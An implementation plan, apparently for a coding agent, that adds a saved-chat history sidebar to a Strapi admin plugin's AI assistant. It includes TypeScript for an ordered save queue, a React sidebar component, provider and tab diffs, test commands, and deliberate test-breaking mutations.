export const withSavedChat = (list: readonly SavedChatRow[], row: SavedChatRow): SavedChatRow[] => [row, ...list.filter((chat) => chat.documentId !== row.documentId)];

/** The list without a chat that was deleted. */
export const withoutSavedChat = (list: readonly SavedChatRow[], documentId: string): SavedChatRow[] => list.filter((chat) => chat.documentId !== documentId);

/** What a chat holds, as one string, to tell whether it has changed since it was last saved or opened. */
export const savedKeyOf = (messages: readonly unknown[]): string => JSON.stringify(messages);

/** Whether a chat needs saving: it has messages, and they are not what was last saved or opened. An empty chat is never saved. */
export const needsSaving = (messages: readonly unknown[], savedKey: string): boolean => messages.length > 0 && savedKeyOf(messages) !== savedKey;

/** What is saved of a chat: its title and its messages. */
export interface ChatSnapshot {
  title: string;
  messages: unknown[];
}

export interface SaveQueueDeps {
  create: (snapshot: ChatSnapshot) => Promise<SavedChatRow>;
  update: (documentId: string, snapshot: ChatSnapshot) => Promise<SavedChatRow>;
  /** A save went through. `current` is whether the chat it saved is still the open one: staff may have started another since. */
  onSaved: (row: SavedChatRow, info: { created: boolean; current: boolean }) => void;
  /** A save failed. The queue goes on with the next. */
  onError: (error: unknown) => void;
}

export interface SaveQueue {
  /** The saved chat that is open, or null for a chat that has not been saved yet. */
  openId: () => string | null;
  /** The open chat is now another one: a saved chat (its ID), or a new chat (null). A save still waiting goes on to the chat it was made for. */
  switchTo: (documentId: string | null) => void;
  /** Saves the open chat, after every save made before this one. The first save of a new chat creates it, and the later ones update it. */
  save: (snapshot: ChatSnapshot) => Promise<void>;
  /** Resolves when every save made so far is over. */
  idle: () => Promise<void>;
  /** A chat was deleted: nothing is saved into it again. When it is the open chat, the next save creates a new one. */
  forget: (documentId: string) => void;
}

/** Whether an error from Strapi's fetch client is a 404: the chat is not there any more (deleted elsewhere, or cleared by Reset demo activity). */
export const isNotFound = (error: unknown): boolean => isRecord(error) && error.status === 404;

/**
 * The saves of the open chat, one at a time, in order. Two saves that ran side by side would each find that the chat has no ID yet and
 * each create it, and one chat would be in the list twice (strapi-plugin-tanstack-ai had exactly that bug). So every save waits for the one
 * before it, and a save reads the chat's ID when it runs, after the save before it has created the chat.
 *
 * A save belongs to the chat that was open when it was made. Staff may start another chat before it runs, and it still goes to the first.
 * What a create answers is adopted as the open chat's ID only while that chat is still the open one.
 */
export const createSaveQueue = (deps: SaveQueueDeps): SaveQueue => {
  // Each chat that has been open has a number. `ids` holds the ID of each that is saved.
  let current = 0;
  const ids = new Map<number, string>();
  let tail: Promise<void> = Promise.resolve();

  const enqueue = (job: () => Promise<void>): Promise<void> => {
    const run = tail.then(job);
    // The job catches what it throws, so this only keeps the chain going whatever happens.
    tail = run.catch(() => {});
    return run;
  };

  return {
    openId: () => ids.get(current) ?? null,

    switchTo(documentId) {
      current += 1;
      if (documentId !== null) ids.set(current, documentId);
    },

    save(snapshot) {
      const chat = current;
      return enqueue(async () => {
        const create = async () => {
          const row = await deps.create(snapshot);
          ids.set(chat, row.documentId);
          deps.onSaved(row, { created: true, current: chat === current });
        };
        try {
          const documentId = ids.get(chat);
          if (documentId === undefined) return await create();
          try {
            const row = await deps.update(documentId, snapshot);
            deps.onSaved(row, { created: false, current: chat === current });
          } catch (error) {
            if (!isNotFound(error)) throw error;
            // The chat was deleted elsewhere. What staff have is saved again, as a new chat.
            ids.delete(chat);
            await create();
          }
        } catch (error) {
          deps.onError(error);
        }
      });
    },

    idle: () => tail,

    forget(documentId) {
      for (const [chat, id] of ids) if (id === documentId) ids.delete(chat);
    },
  };
};
```

- [ ] **Step 4: Write the sidebar**

`ConversationSidebar.tsx` is the reference's `ConversationSidebar.tsx` without "Manage history", with the three differences in the Decisions above: off while an answer comes, `inert` when closed, and `aria-current` on the open chat's row with a trash button named for its chat. The row is a container holding two sibling buttons, never a button inside a button.

Create `admin/src/components/assistant/ConversationSidebar.tsx`:

```tsx
import { Box, Typography } from '@strapi/design-system';
import { Plus, Trash } from '@strapi/icons';
import styled from 'styled-components';

import type { SavedChatRow } from '../../conversations';

/**
 * The history sidebar, copied from strapi-plugin-tanstack-ai 1.6.0 (`ConversationSidebar.tsx`): 260px wide when open, and closed it
 * collapses to no width instead of leaving the page, so opening it is a width change and not a jump in the layout. At the top is New chat,
 * under it the list of this admin's chats, newest first, each row a title and a trash button that shows on hover or keyboard focus.
 * Without "Manage history": Maison has no page for it.
 *
 * What differs from the reference, on purpose:
 * - While an answer comes, the rows, New chat and the trash buttons are off. Opening another chat then would swap the messages under an
 *   answer that is still being written.
 * - A closed sidebar is `inert`, so its buttons leave the tab order. The reference sets only `aria-hidden`, which leaves them focusable.
 * - The open chat's row says so to screen readers (`aria-current`), and each trash button names its chat.
 */

const SidebarRoot = styled.div<{ $open: boolean }>`
  width: ${({ $open }) => ($open ? '260px' : '0px')};
  min-width: ${({ $open }) => ($open ? '260px' : '0px')};
  display: flex;
  flex-direction: column;
  border-right: ${({ $open, theme }) => ($open ? `1px solid ${theme.colors.neutral200}` : 'none')};
  background: ${({ theme }) => theme.colors.neutral100};
  overflow: hidden;
  transition: width 0.2s ease, min-width 0.2s ease;

  @media (prefers-reduced-motion: reduce) {
    transition: none;
  }
`;

const NewChatButton = styled.button`
  display: flex;
  align-items: center;
  gap: 8px;
  width: 100%;
  padding: 8px 12px;
  border: 1px solid ${({ theme }) => theme.colors.neutral200};
  border-radius: 4px;
  background: ${({ theme }) => theme.colors.neutral0};
  color: ${({ theme }) => theme.colors.neutral800};
  font-size: 14px;
  font-weight: 500;
  cursor: pointer;

  &:hover:not(:disabled) {
    background: ${({ theme }) => theme.colors.neutral100};
  }

  &:disabled {
    opacity: 0.5;
    cursor: not-allowed;
  }

  svg {
    width: 16px;
    height: 16px;
  }
`;

const ChatList = styled.div`
  flex: 1;
  overflow-y: auto;
`;

/**
 * The row is a container holding two siblings, not a button holding a button. Nesting them is invalid HTML that browsers recover from
 * unpredictably, and the outer control's accessible name then absorbs the inner one's label.
 */
const Row = styled.div<{ $active: boolean }>`
  width: 100%;
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 4px;
  padding: 0 12px 0 0;
  background: ${({ $active, theme }) => ($active ? theme.colors.neutral200 : 'transparent')};

  &:hover {
    background: ${({ theme }) => theme.colors.neutral200};
  }

  /* Also shown on keyboard focus, or the trash button would be for the mouse only. */
  &:hover .delete-btn:not(:disabled),
  & .delete-btn:focus-visible:not(:disabled) {
    opacity: 1;
  }
`;

const SelectButton = styled.button`
  flex: 1;
  min-width: 0;
  display: flex;
  align-items: center;
  padding: 10px 0 10px 12px;
  border: none;
  background: transparent;
  cursor: pointer;
  text-align: left;

  &:disabled {
    opacity: 0.5;
    cursor: not-allowed;
  }
`;

const DeleteButton = styled.button`
  opacity: 0;
  transition: opacity 0.15s;
  flex-shrink: 0;
  display: flex;
  align-items: center;
  justify-content: center;
  width: 24px;
  height: 24px;
  border-radius: 4px;
  color: ${({ theme }) => theme.colors.neutral600};

  &:hover:not(:disabled) {
    background: ${({ theme }) => theme.colors.neutral300};
    color: ${({ theme }) => theme.colors.danger600};
  }

  &:disabled {
    cursor: not-allowed;
  }

  svg {
    width: 14px;
    height: 14px;
  }
`;

const Title = styled(Typography)`
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  flex: 1;
  min-width: 0;
`;

interface ConversationSidebarProps {
  chats: readonly SavedChatRow[];
  /** The saved chat that is open, null for one that is not saved yet. */
  openId: string | null;
  open: boolean;
  /** An answer is on its way: the rows, New chat and the trash buttons are off. */
  busy: boolean;
  onSelect: (documentId: string) => void;
  onNew: () => void;
  onDelete: (documentId: string) => void;
}

export const ConversationSidebar = ({ chats, openId, open, busy, onSelect, onNew, onDelete }: ConversationSidebarProps) => (
  // React 18 has no `inert` property: the attribute is written as an empty string, which is how a browser reads a boolean attribute.
  <SidebarRoot $open={open} aria-hidden={!open} aria-label="Saved chats" {...(open ? {} : { inert: '' })}>
    <Box padding={3}>
      <NewChatButton type="button" disabled={busy} onClick={onNew}>
        <Plus />
        New chat
      </NewChatButton>
    </Box>

    <ChatList>
      {chats.map((chat) => (
        <Row key={chat.documentId} $active={chat.documentId === openId}>
          <SelectButton type="button" disabled={busy} aria-current={chat.documentId === openId ? 'true' : undefined} onClick={() => onSelect(chat.documentId)}>
            <Title variant="omega" textColor="neutral800">
              {chat.title}
            </Title>
          </SelectButton>
          <DeleteButton type="button" className="delete-btn" disabled={busy} aria-label={`Delete chat: ${chat.title}`} onClick={() => onDelete(chat.documentId)}>
            <Trash />
          </DeleteButton>
        </Row>
      ))}

      {chats.length === 0 && (
        <Box padding={4}>
          <Typography variant="omega" textColor="neutral500">
            No saved chats yet.
          </Typography>
        </Box>
      )}
    </ChatList>
  </SidebarRoot>
);
```

- [ ] **Step 5: Put the sidebar and the History button in the chat area**

`admin/src/components/assistant/ChatArea.tsx`: the sidebar goes to the left of the chat column, and History is the first button of the top bar. It says "Hide history" while the sidebar is open.

```diff
@@
 import { ChatColumn, ChatLayout, ChatTopBar, TopBarSpacer } from './ChatFrame';
 import { ModelBadge } from './ModelBadge';
 import { ToolsPopover } from './ToolsPopover';
-import { NewChatIcon, TopBarIcon } from './TopBarIcon';
+import { HistoryIcon, NewChatIcon, TopBarIcon } from './TopBarIcon';
 
 interface ChatAreaProps {
   model: string;
@@
   /** The notice under the messages offers a new chat as the way on: the button says so, in words. */
   newChatOffered: boolean;
   onNewChat: () => void;
+  /** The history sidebar, to the left of the chat column. */
+  sidebar: ReactNode;
+  /** Whether the sidebar is open: the History button shows it, and its label says what it will do. */
+  historyOpen: boolean;
+  onToggleHistory: () => void;
   /** The chat column under the top bar: the messages, the error box and the composer. */
   children: ReactNode;
 }
 
 /**
- * The chat area: a white rectangle with the chat column in it, and in the column the top bar and what is under it. From the left, the top
- * bar has the tools, the model, and at the right end New chat. strapi-plugin-tanstack-ai's context badge, "local" marker, memories and
- * notes are not copied.
+ * The chat area: a white rectangle with the sidebar and the chat column in it, and in the column the top bar and what is under it. From
+ * the left, the top bar has History, the tools and the model, and at the right end New chat. strapi-plugin-tanstack-ai's context badge,
+ * "local" marker, memories and notes are not copied.
  */
-export const ChatArea = ({ model, tools, canStartOver, newChatOffered, onNewChat, children }: ChatAreaProps) => (
+export const ChatArea = ({ model, tools, canStartOver, newChatOffered, onNewChat, sidebar, historyOpen, onToggleHistory, children }: ChatAreaProps) => (
   <ChatLayout>
+    {sidebar}
     <ChatColumn>
       <ChatTopBar>
+        <TopBarIcon label={historyOpen ? 'Hide history' : 'History'} active={historyOpen} expanded={historyOpen} onClick={onToggleHistory}>
+          <HistoryIcon />
+        </TopBarIcon>
         <ToolsPopover tools={tools} />
         <ModelBadge model={model} />
         <TopBarSpacer />
```

- [ ] **Step 6: Save and switch chats in the provider**

`AssistantProvider.tsx` still owns `useChat`, the draft, the notice and the status. What it gains, in the order of the file: the fetch client is read through a ref (`clientRef`), because the connection and the save queue are made once; the state of the saved chats (`chats`, `openId`, `sidebarOpen`, `historyError`) and three refs (`savedKey`, `acted`, `opening`); the save queue; `saveNow`; the idle effect, which now ends with `saveNow(next)`; `showChat`, `loadList`, `openChat` and `deleteChat`; the effect that reopens the most recent chat when the assistant is ready; `acted` set in `send`; and `newChat`, which saves the cleaned chat before it starts another.

```diff
@@
   type MessageSource,
   type SentQuestion,
 } from '../../assistant';
+import {
+  CONVERSATION_PATHS,
+  HISTORY_ERRORS,
+  conversationTitle,
+  createSaveQueue,
+  isChatAnswer,
+  isChatList,
+  isNotFound,
+  isSavedAnswer,
+  needsSaving,
+  savedKeyOf,
+  withSavedChat,
+  withoutSavedChat,
+  type ChatSnapshot,
+  type SavedChatRow,
+} from '../../conversations';
 import { useMounted } from '../../useMounted';
 
 /**
@@
     return 'jwtToken';
   }
 };
+
+/** The saved chats: the list, the one that is open, the sidebar, and what to do with them. */
+export interface AssistantHistory {
+  chats: SavedChatRow[];
+  /** The saved chat that is open. Null for a chat that is not saved yet: it is saved after its first turn. */
+  openId: string | null;
+  sidebarOpen: boolean;
+  setSidebarOpen: (open: boolean) => void;
+  /** What went wrong with the last call to the saved chats, in words for staff. The next call that works clears it. */
+  error: string | null;
+  /** Opens a saved chat in place of the one on the screen. Does nothing while an answer is on its way. */
+  openChat: (documentId: string) => Promise<void>;
+  /** Deletes a saved chat at once. When it is the open chat, the chat on the screen is emptied. Does nothing while an answer is on its way. */
+  deleteChat: (documentId: string) => Promise<void>;
+}
 
 export interface AssistantApi {
   /** null until GET /maison/assistant/status answers. */
@@
   send: (text: string, source?: MessageSource) => Promise<void>;
   /** Stops the answer where it is, and takes out a tool call that was being written. Stop is no error. */
   stop: () => void;
-  /** Clears the chat: the messages, the notice and the note. The draft stays. */
+  /** Starts a new chat. The chat that was open stays saved, and the draft stays. */
   newChat: () => void;
   /** Asks /status again, for after the key was set. */
   recheck: () => Promise<void>;
+  history: AssistantHistory;
 }
 
 const AssistantContext = React.createContext<AssistantApi | null>(null);
@@
 /**
  * The chat, kept above the tabs. Radix unmounts a tab's content when the tab isn't selected, so a chat held by the Ask tab
  * would be gone when staff look at a list and come back. Here it lives as long as the Maison page does, and the tab only reads it.
+ *
+ * It also keeps the admin's saved chats. Each turn that ends saves the open chat, one save at a time (`createSaveQueue`), with only the
+ * messages that were cleaned of cut-off tool calls and failed turns. When the assistant is ready, the list loads and the most recent chat
+ * is reopened. A chat is switched with `setMessages`, never by changing the thread: that would build the chat client again.
  */
 export const AssistantProvider = ({ children }: { children: React.ReactNode }) => {
-  const { get } = useFetchClient();
+  const fetchClient = useFetchClient();
   const mounted = useMounted();
-  // useChat keeps its connection from the first render, so the connection reads `get` through a ref.
-  const getRef = React.useRef(get);
-  getRef.current = get;
+  // useChat keeps its connection from the first render, and the save queue is made once, so both read the fetch client through a ref.
+  const clientRef = React.useRef(fetchClient);
+  clientRef.current = fetchClient;
 
   const [status, setStatus] = React.useState<AssistantStatus | null>(null);
   const [statusError, setStatusError] = React.useState<string | null>(null);
@@
   // Set by onError, and settled when the chat is idle: by then the failed run's messages are in the chat.
   const [failedTurn, setFailedTurn] = React.useState<{ question: SentQuestion | null } | null>(null);
 
+  const [chats, setChats] = React.useState<SavedChatRow[]>([]);
+  const [openId, setOpenId] = React.useState<string | null>(null);
+  const [sidebarOpen, setSidebarOpen] = React.useState(false);
+  const [historyError, setHistoryError] = React.useState<string | null>(null);
+  // What the open chat held when it was last saved or opened, so it is saved again only when it has changed.
+  const savedKey = React.useRef('');
+  // Staff have started something (a message, New chat, another chat): the first load must not reopen the most recent chat over it.
+  const acted = React.useRef(false);
+  // The number of the latest request to open a chat. An answer that is not for the latest is dropped.
+  const opening = React.useRef(0);
+
   const recheck = React.useCallback(async (): Promise<void> => {
     try {
-      const { data } = await getRef.current<unknown>(ASSISTANT_PATHS.status);
+      const { data } = await clientRef.current.get<unknown>(ASSISTANT_PATHS.status);
       if (!mounted.current) return;
       if (isStatus(data)) {
         setStatus(data);
@@
         // A stream needs a plain fetch, which Strapi doesn't refresh an expired admin token for. A call through its own client does,
         // so one goes first: the token read after it is the fresh one. If it fails, the chat request says what is wrong.
         try {
-          await getRef.current(ASSISTANT_PATHS.status);
+          await clientRef.current.get(ASSISTANT_PATHS.status);
         } catch {
           // Nothing to do here.
         }
@@
   const busyRef = React.useRef(busy);
   busyRef.current = busy;
 
+  /** The answer of a save, which must name the chat it saved. */
+  const savedRow = (data: unknown): SavedChatRow => {
+    if (!isSavedAnswer(data)) throw new Error('The answer was not a saved chat.');
+    return data.conversation;
+  };
+
+  // The saves of the open chat, one at a time. Made once: it reads everything that changes through refs and stable setters.
+  const [queue] = React.useState(() =>
+    createSaveQueue({
+      create: async (snapshot: ChatSnapshot) => savedRow((await clientRef.current.post<unknown>(CONVERSATION_PATHS.list, snapshot)).data),
+      update: async (documentId: string, snapshot: ChatSnapshot) => savedRow((await clientRef.current.put<unknown>(CONVERSATION_PATHS.one(documentId), snapshot)).data),
+      onSaved: (row, { current }) => {
+        if (!mounted.current) return;
+        setChats((list) => withSavedChat(list, row));
+        // A chat that staff have already left is not the open one: its row is in the list, and nothing else changes.
+        if (current) setOpenId(row.documentId);
+        setHistoryError(null);
+      },
+      onError: () => {
+        if (mounted.current) setHistoryError(HISTORY_ERRORS.save);
+      },
+    })
+  );
+
+  /** Saves the chat on the screen, when it has something that was not saved yet. An empty chat is never saved. */
+  const saveNow = React.useCallback(
+    (messages: UIMessage[]) => {
+      if (!needsSaving(messages, savedKey.current)) return;
+      savedKey.current = savedKeyOf(messages);
+      void queue.save({ title: conversationTitle(messages), messages });
+    },
+    [queue]
+  );
+
   /** Takes out a tool call that was cut off (see withoutOpenToolCalls), so the chat never shows it as running and never replays it. */
   const dropOpenToolCalls = React.useCallback(() => {
     const current = messagesRef.current;
@@
   // Whenever nothing is answering, a tool call that was cut off is taken out, and a turn that failed with nothing to read is taken
   // back. This is the one place that holds after Stop, a dropped connection and a timeout alike: TanStack AI goes on processing the
   // chunks it already has after Stop, so a call taken out right after Stop can come back a moment later, and onError runs before
-  // the messages of the failed run have reached this component.
+  // the messages of the failed run have reached this component. The same place saves the chat, with the cleaned messages: a turn that
+  // ended, however it ended, leaves the chat saved. A chat that has not changed since it was saved is not saved again.
   const idle = !busy;
   React.useEffect(() => {
     if (!idle) return;
@@
       setDraft((current) => draftAfterFailure({ draft: current, question }));
     }
     if (next !== chat.messages) setMessages(next);
-  }, [idle, chat.messages, failedTurn, setMessages]);
+    saveNow(next);
+  }, [idle, chat.messages, failedTurn, setMessages, saveNow]);
+
+  /** Shows a chat: a saved one, or a new one (null with no messages). The queue, the saved key and the screen all change together. */
+  const showChat = React.useCallback(
+    (documentId: string | null, messages: UIMessage[]) => {
+      queue.switchTo(documentId);
+      savedKey.current = savedKeyOf(messages);
+      setMessages(messages);
+      setOpenId(documentId);
+      setNotice(null);
+      setNote(null);
+      setFailedTurn(null);
+    },
+    [queue, setMessages]
+  );
+
+  const loadList = React.useCallback(async (): Promise<SavedChatRow[] | null> => {
+    try {
+      const { data } = await clientRef.current.get<unknown>(CONVERSATION_PATHS.list);
+      if (!isChatList(data)) throw new Error('The answer was not a list of chats.');
+      if (!mounted.current) return null;
+      setChats(data.conversations);
+      return data.conversations;
+    } catch {
+      if (mounted.current) setHistoryError(HISTORY_ERRORS.list);
+      return null;
+    }
+  }, [mounted]);
+
+  const openChat = React.useCallback(
+    async (documentId: string): Promise<void> => {
+      // Opening a chat in the middle of an answer would swap the messages under it.
+      if (busyRef.current) return;
+      acted.current = true;
+      opening.current += 1;
+      const request = opening.current;
+      try {
+        // Saves that are still on their way finish first, so the chat that is left behind is saved as it was.
+        await queue.idle();
+        const { data } = await clientRef.current.get<unknown>(CONVERSATION_PATHS.one(documentId));
+        if (!isChatAnswer(data)) throw new Error('The answer was not a chat.');
+        // Another chat was chosen, or a message was sent, while this one was on its way: the latest choice wins.
+        if (!mounted.current || request !== opening.current || busyRef.current) return;
+        showChat(documentId, data.conversation.messages as UIMessage[]);
+        setHistoryError(null);
+      } catch {
+        if (!mounted.current) return;
+        setHistoryError(HISTORY_ERRORS.open);
+        // A chat that could not be opened may be gone: the list shows what is there.
+        void loadList();
+      }
+    },
+    [queue, showChat, loadList, mounted]
+  );
+
+  const deleteChat = React.useCallback(
+    async (documentId: string): Promise<void> => {
+      if (busyRef.current) return;
+      acted.current = true;
+      try {
+        // Saves still on their way finish first: one that ran after the delete would find no chat to save into.
+        await queue.idle();
+        await clientRef.current.del(CONVERSATION_PATHS.one(documentId));
+      } catch (error) {
+        // A chat that is not there any more is deleted all the same.
+        if (!isNotFound(error)) {
+          if (mounted.current) setHistoryError(HISTORY_ERRORS.remove);
+          return;
+        }
+      }
+      if (!mounted.current) return;
+      const wasOpen = queue.openId() === documentId;
+      queue.forget(documentId);
+      setChats((list) => withoutSavedChat(list, documentId));
+      setHistoryError(null);
+      if (wasOpen) {
+        opening.current += 1;
+        showChat(null, []);
+      }
+    },
+    [queue, showChat, mounted]
+  );
+
+  // When the assistant is ready for the first time, the list loads and the most recent chat is reopened, unless staff have begun something.
+  const loadedFirst = React.useRef(false);
+  React.useEffect(() => {
+    if (!ready || loadedFirst.current) return;
+    loadedFirst.current = true;
+    void (async () => {
+      const list = await loadList();
+      if (list && list.length > 0 && !acted.current && messagesRef.current.length === 0) await openChat(list[0].documentId);
+    })();
+  }, [ready, loadList, openChat]);
 
   const send = React.useCallback(
     async (text: string, source: MessageSource = 'box'): Promise<void> => {
       // useChat would drop a send made while an answer is on its way. Nothing is changed for it: the box keeps its text.
       if (busyRef.current) return;
+      acted.current = true;
       dropOpenToolCalls();
       asked.current = { text, source };
       setFailedTurn(null);
@@
   }, [stopChat, dropOpenToolCalls]);
 
   const newChat = React.useCallback(() => {
+    acted.current = true;
+    opening.current += 1;
     stopChat();
+    // What is on the screen is saved first, so an answer that was stopped stays in its chat. A question with no answer yet is not part of it.
+    saveNow(withoutFailedTurn(withoutOpenToolCalls(messagesRef.current)));
+    queue.switchTo(null);
+    savedKey.current = '';
     clear();
+    setOpenId(null);
     setNotice(null);
     setNote(null);
     setFailedTurn(null);
-  }, [stopChat, clear]);
+    setHistoryError(null);
+  }, [stopChat, clear, saveNow, queue]);
+
+  const history = React.useMemo<AssistantHistory>(
+    () => ({ chats, openId, sidebarOpen, setSidebarOpen, error: historyError, openChat, deleteChat }),
+    [chats, openId, sidebarOpen, historyError, openChat, deleteChat]
+  );
 
   const api = React.useMemo<AssistantApi>(
     () => ({
@@
       stop,
       newChat,
       recheck,
+      history,
     }),
-    [status, statusError, ready, chat.messages, busy, notice, note, draft, send, stop, newChat, recheck]
+    [status, statusError, ready, chat.messages, busy, notice, note, draft, send, stop, newChat, recheck, history]
   );
 
   return <AssistantContext.Provider value={api}>{children}</AssistantContext.Provider>;
```

- [ ] **Step 7: Show the sidebar and the history error in the tab**

`admin/src/components/assistant/AskTab.tsx`: it passes the sidebar to the chat area, and the red box shows a turn's error first, else the problem with the saved chats.

```diff
@@
 import { useAssistant } from './AssistantProvider';
 import { ChatArea } from './ChatArea';
 import { Composer } from './Composer';
+import { ConversationSidebar } from './ConversationSidebar';
 import { ErrorBox, NoteBox } from './ErrorBox';
 import { MessageList } from './MessageList';
 import { SetupNotice } from './SetupNotice';
@@
     );
   }
 
-  const { busy, ready, notice, note, draft } = assistant;
+  const { busy, ready, notice, note, draft, history } = assistant;
 
   const send = (message: string, source: MessageSource) => {
     if (!canSend({ text: message, busy, ready })) return;
@@
       canStartOver={assistant.messages.length > 0 || notice !== null || note !== null}
       newChatOffered={notice?.newChat === true}
       onNewChat={assistant.newChat}
+      sidebar={<ConversationSidebar chats={history.chats} openId={history.openId} open={history.sidebarOpen} busy={busy} onSelect={(id) => void history.openChat(id)} onNew={assistant.newChat} onDelete={(id) => void history.deleteChat(id)} />}
+      historyOpen={history.sidebarOpen}
+      onToggleHistory={() => history.setSidebarOpen(!history.sidebarOpen)}
     >
       <MessageList messages={assistant.messages} busy={busy} onStarter={(starter) => send(starter, 'starter')} canStart={(starter) => canSend({ text: starter, busy, ready })} />
-      {notice && <ErrorBox>{notice.text}</ErrorBox>}
+      {/* A turn's error wins over a problem with the saved chats: it is about what staff are watching. */}
+      {(notice?.text ?? history.error) && <ErrorBox>{notice?.text ?? history.error}</ErrorBox>}
       {note && <NoteBox>{note}</NoteBox>}
       <Composer draft={draft} onDraft={assistant.setDraft} busy={busy} ready={ready} onSend={(text) => send(text, 'box')} onStop={assistant.stop} textareaRef={box} />
     </ChatArea>
```

- [ ] **Step 8: Run the tests, then everything**

Run: `npm test -- test/unit/conversations-admin.test.ts test/unit/conversation-sidebar.test.tsx test/unit/chat-area.test.tsx test/unit/ask-tab.test.tsx`
Expected: PASS, `Test Files  4 passed (4)` and `Tests  114 passed (114)`.

Run: `npm test`
Expected: PASS, `Test Files  112 passed (112)` and `Tests  3214 passed (3214)`.

Run: `npm run test:ts:back` and `npm run test:ts:front`
Expected: both finish with no error output.

Run: `rm -rf dist && npm run build`
Expected: it ends with `Build complete!`.

Run: `node scripts/check-esm-import.mjs`
Expected: exit 0, with one `ok` line for each of `dist/server/index.js` and `dist/server/index.mjs` saying there is no static load of `@tanstack/ai`.

Run: `node ../../../scripts/share-strapi-utils.mjs --check`
Expected: `Maison and oauth-mcp-manager share Strapi core's @strapi/utils.`

- [ ] **Step 9: (Paul) Look at it in the browser**

Skip this step and say so in the report. Paul runs it with the checklist in Task 8: History opens and closes the sidebar, a chat is reopened after a reload, New chat keeps the old chat, a chat can be deleted, and the sidebar is off while an answer comes.

- [ ] **Step 10: Prove the tests can fail**

Make each change, run the file named, see it fail, and undo the change.

In `enqueue` in `admin/src/conversations.ts`, start every save at once instead of after the one before it: `const run = job();`.

Run: `npm test -- test/unit/conversations-admin.test.ts`
Expected: FAIL, among others: `the save queue > creates a chat once when two saves are made before the first has answered: the second waits and updates it`; `the save queue > runs the saves one at a time, in the order they were made`.

In `save` in `admin/src/conversations.ts`, read the open chat when the save runs, not when it is made: delete `const chat = current;` above `return enqueue(async () => {`, and write it again as the first line inside that function.

Run: `npm test -- test/unit/conversations-admin.test.ts`
Expected: FAIL, among others: `the save queue > starting another chat > does not give the new chat the ID of the chat that was being created: the create is for the chat it was made for`; `the save queue > starting another chat > sends a save that was made before the switch to the chat it was made for, even when it runs after it`; `the save queue > starting another chat > tells that an update is not for the open chat when staff moved on before it ran`.

In `save` in `admin/src/conversations.ts`, tell that every update is for the open chat: in the `deps.onSaved(row, { created: false, ... })` call, write `current: true`.

Run: `npm test -- test/unit/conversations-admin.test.ts`
Expected: FAIL, among others: `the save queue > starting another chat > tells that an update is not for the open chat when staff moved on before it ran`.

In `isNotFound` in `admin/src/conversations.ts`, never see a 404: `return false` in place of `isRecord(error) && error.status === 404`.

Run: `npm test -- test/unit/conversations-admin.test.ts`
Expected: FAIL, among others: `the save queue > saves a chat again as a new chat when the chat is not there any more: deleted elsewhere, or cleared by Reset demo activity`; `the save queue > reports a 404 on the create it falls back to like any other failure`.

In `conversationTitle` in `admin/src/conversations.ts`, cut by UTF-16 units: replace `Array.from(line).slice(0, MAX_TITLE).join('')` with `line.slice(0, MAX_TITLE)`.

Run: `npm test -- test/unit/conversations-admin.test.ts`
Expected: FAIL, among others: `conversationTitle > counts characters, so an emoji or a Japanese character is never split`; `conversationTitle > is cut exactly as the server cuts a title`.

In `needsSaving` in `admin/src/conversations.ts`, save an empty chat too: delete `messages.length > 0 && `.

Run: `npm test -- test/unit/conversations-admin.test.ts`
Expected: FAIL, among others: `needsSaving > is false for an empty chat, whatever was saved: an empty chat is never saved`.

In `ConversationSidebar.tsx`, leave the rows on while an answer comes: in `<SelectButton type="button" disabled={busy}`, write `disabled={false}`.

Run: `npm test -- test/unit/conversation-sidebar.test.tsx`
Expected: FAIL, among others: `ConversationSidebar > while an answer comes > switches off every row, every trash button and New chat, and does nothing when they are pressed`.

In `ConversationSidebar.tsx`, do not make the closed sidebar inert: replace `{...(open ? {} : { inert: '' })}` with `{...{}}`.

Run: `npm test -- test/unit/conversation-sidebar.test.tsx`
Expected: FAIL, among others: `ConversationSidebar > closed > is hidden from screen readers and inert, so its buttons leave the tab order`.

In `SidebarRoot` in `ConversationSidebar.tsx`, change the open `width` (not the `min-width`) to 200px.

Run: `npm test -- test/unit/conversation-sidebar.test.tsx`
Expected: FAIL, among others: `ConversationSidebar > closed > is 260px wide when open and has no width at all when closed, so opening it changes its width and nothing around it`.

In `ChatArea.tsx`, never say "Hide history": `label="History"`.

Run: `npm test -- test/unit/chat-area.test.tsx`
Expected: FAIL, among others: `ChatArea > opens and closes the sidebar with History, which says what it will do and whether the sidebar is open`.

In the idle effect in `AssistantProvider.tsx`, save the messages as they are, not the cleaned ones: `saveNow(chat.messages);`.

Run: `npm test -- test/unit/ask-tab.test.tsx`
Expected: FAIL, among others: `saved chats > saving > saves nothing for a turn that failed before anything came back, and nothing for an empty chat`.

In `saveNow` in `AssistantProvider.tsx`, drop the signatures when saving: replace `messages` in `void queue.save({ title: conversationTitle(messages), messages });` with `JSON.parse(JSON.stringify(messages, (key, value) => (key === 'signature' ? undefined : value)))`.

Run: `npm test -- test/unit/ask-tab.test.tsx`
Expected: FAIL, among others: `saved chats > keeps every key of every part of a chat it opens, so it saves the chat again as it was: a thinking part keeps its signature`.

In `newChat` in `AssistantProvider.tsx`, do not save the chat that is left: delete the line `saveNow(withoutFailedTurn(withoutOpenToolCalls(messagesRef.current)));`.

Run: `npm test -- test/unit/ask-tab.test.tsx`
Expected: FAIL, among others: `saved chats > New chat > saves the chat as it is when New chat stops an answer on its way: what had come stays in the chat it belongs to`.

In `deleteChat` in `AssistantProvider.tsx`, do not wait for the saves: delete the line `await queue.idle();` under the comment "Saves still on their way finish first".

Run: `npm test -- test/unit/ask-tab.test.tsx`
Expected: FAIL, among others: `saved chats > deleting > waits for a save that is on its way before it deletes the chat`.

In `openChat` in `AssistantProvider.tsx`, do not wait for the saves: delete the line `await queue.idle();` under the comment "Saves that are still on their way finish first".

Run: `npm test -- test/unit/ask-tab.test.tsx`
Expected: FAIL, among others: `saved chats > waits for a save that is on its way before it opens another chat, so the chat that is left is saved as it was`.

In `openChat` in `AssistantProvider.tsx`, let a late answer win: delete `request !== opening.current || `.

Run: `npm test -- test/unit/ask-tab.test.tsx`
Expected: FAIL, among others: `saved chats > opens the chat that was chosen last when two are chosen one after the other: the answer that comes late is dropped`.

In `openChat` in `AssistantProvider.tsx`, open a chat while an answer comes: delete the line `if (busyRef.current) return;` under the comment "Opening a chat in the middle of an answer".

Run: `npm test -- test/unit/ask-tab.test.tsx`
Expected: FAIL, among others: `saved chats > does nothing when it is asked to open or delete a chat while an answer comes: that is part of what the page offers`.

